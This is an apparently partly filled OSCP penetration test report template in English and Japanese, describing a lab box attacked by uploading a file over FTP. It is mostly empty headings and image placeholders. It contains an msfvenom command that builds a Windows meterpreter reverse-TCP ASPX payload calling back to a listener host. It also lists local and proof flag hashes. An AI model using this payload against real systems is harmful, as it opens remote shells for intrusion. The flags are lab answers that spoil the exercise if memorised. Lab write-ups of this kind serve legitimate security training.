OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![[devel image.png]]

Copyright © 2023 OffSec Ltd. All rights reserved.

この出版物のいかなる部分も、その全部または一部を複製、コピー、譲渡、または著作権所有者に留保するその他の権利(コピーおよびその他すべてのコピー、ネットワークまたはその他の通信手段を使用した転送または送信、遠隔学習のための放送を含む)を、情報ストレージなどのいかなる形式または手段によっても、 OffSecからの事前の書面による許可なしに、送信または検索システム。

[1. OffSec OSCP Exam Penetration Test Report    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_gjdgxs)

[1.1 Introduction    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_30j0zll)

[1.2 Objective    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1fob9te)

[1.3 Requirements    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3znysh7)

[2. High-Level Summary    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2et92p0)

[2.1 Recommendations    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_tyjcwt)

[3. Methodologies    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3dy6vkm)

[3.1 Information Gathering    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1t3h5sf)

[3.2 Service Enumeration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4d34og8)

[3.3 Penetration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2s8eyo1)

[3.4 Maintaining Access    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_17dp8vu)

[3.5 House Cleaning    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3rdcrjn)

[4. Independent Challenges    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_26in1rg)

[4.1 Target #1 – 192.168.232.55    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_lnxbz9)

[4.1.1 Service Enumeration    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_35nkun2)

[4.1.2 Initial Access – Anonymous SMB share leads to Wordpress RCE    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ksv4uv)

[5. Active Directory Set    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_44sinio)

[5.1 Ajla – 10.4.4.10    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2jxsxqh)

[5.1.1 Initial Access – Password Brute-Forcing    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_z337ya)

[5.1.2 Privilege Escalation – Sudo group    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3j2qqm3)

[5.1.3 Post-Exploitation    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1y810tw)

[5.2 Poultry – 10.5.5.20    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4i7ojhp)

[5.2.1 Initial Access – RDP login    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2xcytpi)

[5.2.2 Post-Exploitation    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ci93xb)

[5.3 DC – 10.5.5.30    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2bn6wsx)

[5.3.1 Initial Access – Remote Commands Execution    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_qsh70q)

[5.3.2 Post-Exploitation    26](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1pxezwc)

1\. OffSec OSCP 試験ペネトレーション テスト レポート

1.1 はじめに

1.2 目的

1.3 必要条件

2\. ハイレベルなまとめ

3\. メソドロジー

3.1 情報収集

試験ネットワーク:

3.2 サービスの列挙

3.3 浸透

3.4 アクセスの維持

4\. 自主的な課題

4.1ターゲット#1–

4.1.1 初期アクセス –

4.1.2 サービス列挙

![[devel image 1.png]]

![[devel image 2.png]]

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP**: |

4.1.2 初期アクセス – ftp PUT reverse shell

ペイロードの作成

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx > devel.aspx

![[devel image 3.png]]

ftp put

![[devel image 4.png]]

![[devel image 5.png]]

![[devel image 6.png]]

![[devel image 7.png]]

![[devel image 8.png]]

![[devel image 9.png]]

![[devel image 10.png]]

Local.txt値:79602645ddf0bdb33372bf86fe54250d

4.1.3 特権エスカレーション -

4.1.4 エクスプロイト後の処理

Proof.txt値:dc17fe21a9fa14c239f1d03e7307d3cc

- **5. Active Directory Set**

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

5.1 アジュラ – 10.4.4.10

5.1.1 初期アクセス –

5.1.2 特権エスカレーション –

重大度: クリティカル

- **5.1.3 Post-Exploitation**

Screenshot of System Proof:

- **5.2 Poultry – 10.5.5.20**
- 5.2.1 初期アクセス –
- **5.2.2 Post-Exploitation**

**Local Proof Screenshot:**

**5.3 DC – 10.5.5.30**

5.3.1 初期アクセス –

- **5.3.2 Post-Exploitation**

**System Proof Screenshot:**